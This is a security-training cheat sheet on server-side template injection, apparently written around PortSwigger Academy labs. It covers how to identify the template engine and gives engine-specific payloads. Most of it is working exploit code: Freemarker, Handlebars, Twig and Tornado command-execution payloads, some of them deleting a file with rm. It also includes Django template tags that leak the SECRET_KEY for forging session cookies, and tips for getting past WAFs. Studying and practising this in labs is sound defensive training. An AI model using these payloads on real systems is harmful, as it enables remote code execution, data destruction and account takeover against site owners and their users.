# SSTI — Template engine identification and engine-specific RCE

When SSTI is confirmed but the engine isn't obvious, identify it from: (1) error messages that name the engine; (2) behavior differences (`{{7*7}}` vs `${7*7}`); (3) framework-specific objects available. Then use engine-specific RCE chains from documentation or known exploits.

## Quick reference
```
# Engine detection cheat sheet
{{7*7}} → 49                        Twig (PHP) or Jinja2 (Python)
${7*7} → 49 + Freemarker error      Freemarker (Java)
${foobar} → error mentions engine   read the error message
${{<%[%'"}}%\  → any error          polyglot fuzz — engine named in error

# Freemarker RCE (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}

# Handlebars RCE (Node.js) — using wrapping context
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Django debug → information disclosure
{% debug %}

# Django secret key / settings leak
{{settings.SECRET_KEY}}
```

## Root cause
Each template engine has its own syntax and available objects. The exploit chain differs per engine — Freemarker exposes `Execute` directly; Handlebars requires prototype chain traversal; Django exposes `settings` object; Jinja2 requires `__class__.__mro__` chain. Reading documentation or known PoCs is the method.

## Find it
1. Inject polyglot `${{<%[%'"}}%\` — read error message for engine name.
2. Try `${foobar}` → if Freemarker: `freemarker.core.InvalidReferenceException` appears.
3. Try `{{foobar}}` → if Twig: Twig error. If Jinja2: UndefinedError.
4. Try `{{settings.SECRET_KEY}}` in Django → secret key exposed → further exploitation.

## Technique
**Freemarker (using documentation):**
1. Template editor with `${foobar}` → error message shows Freemarker.
2. Search Freemarker docs: FAQ → "Can I allow users to upload templates" → points to `Execute` class.
3. Payload: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
4. Escalate: replace `id` with `rm /home/carlos/morale.txt`.

**Handlebars/unknown language:**
1. `?message=${{<%[%'"}}%\` → error reveals Handlebars.
2. Search "Handlebars SSTI exploit" → known PoC using `#with` + constructor chain.
3. Adapt PoC to run OS command.

**Django (information disclosure):**
1. Template editor → inject `${foobar}` or `{{foobar}}` → error mentions Django.
2. Use `{% debug %}` → dumps available objects and their methods.
3. Use `{{settings.SECRET_KEY}}` → extracts the Django secret key.
4. With the secret key, forge signed cookies/session tokens.

## Payload arsenal
```
# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}

# Django info disclosure
{% debug %}
{{settings.SECRET_KEY}}
{{settings.DATABASES}}

# Twig (PHP) — OS command via filter
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Tornado (Python)
{% import os %}{{os.system('id')}}
```

## Labs

### Server-side template injection using documentation [Practitioner]
Template editor with `${foobar}` → Freemarker error. Documentation: `Execute` class provides OS exec. Payload: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}`. Key insight: template engine documentation always has a "security" section showing the dangerous classes.

### Server-side template injection in an unknown language with a documented exploit [Practitioner]
`?message=${{<%[%'"}}%\` → error reveals Handlebars. Search web for "Handlebars SSTI" → PoC using `#with` + constructor chain → adapt to `execSync('rm /home/carlos/morale.txt')`. Key insight: unknown engine → polyglot fuzz → error names it → public PoC search.

### Server-side template injection with information disclosure via user-supplied objects [Practitioner]
Template editor with `{{foobar}}` → Django error. `{% debug %}` → lists `settings` object. `{{settings.SECRET_KEY}}` → extract key. Key insight: Django's `debug` tag and `settings` object expose cryptographic secrets via SSTI.

## Bypasses
| Block | Bypass |
|---|---|
| WAF on template metacharacters | URL/hex/unicode-encode the probe; split tokens across params |
| Generic error hides engine | force distinct errors per engine; diff `${7*7}` vs `{{7*7}}` vs `#{7*7}` vs `<%= 7*7 %>` |

## Chaining
- Engine identified → engine-specific RCE in [Sandbox-escape-and-advanced](../Sandbox-escape-and-advanced/) → **RCE** ([objectives: RCE](../../references/objectives-attack-trees.md)).

## Real-world notes
- Freemarker's `Execute` class is the canonical Java SSTI primitive — memorize it.
- Django SECRET_KEY exfiltration → forge session cookies → admin account takeover.
- `tplmap` automates engine detection and RCE payload generation.

## References
- https://portswigger.net/web-security/server-side-template-injection
